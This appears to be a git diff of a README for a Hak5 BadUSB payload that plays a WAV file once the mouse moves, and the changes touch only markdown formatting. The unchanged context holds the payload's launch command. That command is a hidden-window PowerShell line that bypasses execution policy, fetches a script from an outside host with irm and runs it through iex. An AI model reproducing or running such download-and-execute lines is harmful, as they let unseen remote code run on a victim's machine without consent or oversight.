@@ -1,3 +1,5 @@
+---
+---
 ![Logo](https://github.com/I-Am-Jakoby/hak5-submissions/blob/main/Assets/logo-170-px.png?raw=true)
 
 <!-- TABLE OF CONTENTS -->
@@ -38,9 +40,9 @@ After a mouse movement is detected, the WAV file will be played.
 * Plug in your device
 * Invoke-WebRequest will be entered in the Run Box to download your WAV file
  
-```
+<pre><code>
 powershell -w h -NoP -NonI -Ep Bypass $wav='';irm https://jakoby.lol/vus | iex
-```
+</code></pre>
 
 <p align="right">(<a href="#top">back to top</a>)</p>
 
